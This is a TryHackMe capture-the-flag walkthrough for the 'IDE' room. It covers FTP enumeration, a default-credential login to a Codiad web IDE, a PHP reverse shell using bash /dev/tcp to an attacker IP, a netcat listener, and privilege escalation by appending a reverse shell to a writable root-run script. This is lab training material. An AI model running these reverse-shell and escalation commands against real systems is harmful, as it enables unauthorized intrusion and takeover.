# 💻 IDE — TryHackMe Walkthrough

**Room:** [IDE](https://tryhackme.com/room/ide)
**Difficulty:** Easy
**Category:** Linux / Web Exploitation / Privilege Escalation
**Tags:** FTP, Codiad IDE, Default Credentials, RCE, Privilege Escalation

---

## 📋 Overview

IDE is a Linux machine featuring a **Codiad web IDE** with default credentials. You'll exploit the IDE to get a reverse shell, then escalate privileges using a misconfigured sudo entry.

---

## 🔧 Tools Used

- `nmap` — Port scanning
- `ftp` — Anonymous FTP access
- Browser — Codiad IDE exploitation
- `nc` — Reverse shell listener

---

## 📡 Step 1: Nmap Scan

```bash
nmap -sV -sC -p- <TARGET_IP>
```

**Results:**
- Port 21 — FTP (anonymous login enabled)
- Port 22 — SSH
- Port 80 — HTTP (redirects or default page)
- Port 62337 — Codiad Web IDE

---

## 📂 Step 2: Anonymous FTP

Log in to FTP anonymously:

```bash
ftp <TARGET_IP>
# Username: anonymous
# Password: (blank/anything)
```

List and download files:

```bash
ls -la
cd ...
get -   # or: get filename
```

Look for credentials or hints in files found on the FTP server.

---

## 🌐 Step 3: Codiad Web IDE

Navigate to `http://<TARGET_IP>:62337`. You'll find the Codiad IDE login. Try default credentials found on FTP or well-known defaults:

```
admin / password
admin / admin
```

Once logged in, you have access to the IDE's file editor and project workspace.

---

## 🐚 Step 4: Remote Code Execution via Codiad

Codiad allows execution of code. Use a Codiad exploit or create a PHP reverse shell file directly in the IDE:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1'");
?>
```

Save as `shell.php` and access it via the web server to trigger execution.

Set up listener first:
```bash
nc -lvnp 4444
```

---

## 🔼 Step 5: Privilege Escalation

Stabilise the shell, then enumerate:

```bash
sudo -l
```

Look for a writable service file or script that runs as a higher-privileged user. A common path:

```bash
# If a service script is writable:
echo "bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1" >> /path/to/script.sh
# Trigger the service restart
```

Or use a sudo entry to escalate to root.

---

## 🚩 Capture the Flags

```bash
cat /home/<user>/user.txt
cat /root/root.txt
```

---

## 📝 Key Takeaways

- Always check for anonymous FTP — it often leaks credentials or configuration files.
- Web IDEs like Codiad should never be exposed to the internet with default credentials.
- Writable service scripts owned by root are powerful privilege escalation vectors.

---

## 🔗 References

- [Codiad GitHub](https://github.com/Codiad/Codiad)
- [TryHackMe — IDE Room](https://tryhackme.com/room/ide)
- [Walkthrough Reference](https://cybxm0nk.medium.com/ide-tryhackme-walkthrough-6e89286a8df8)
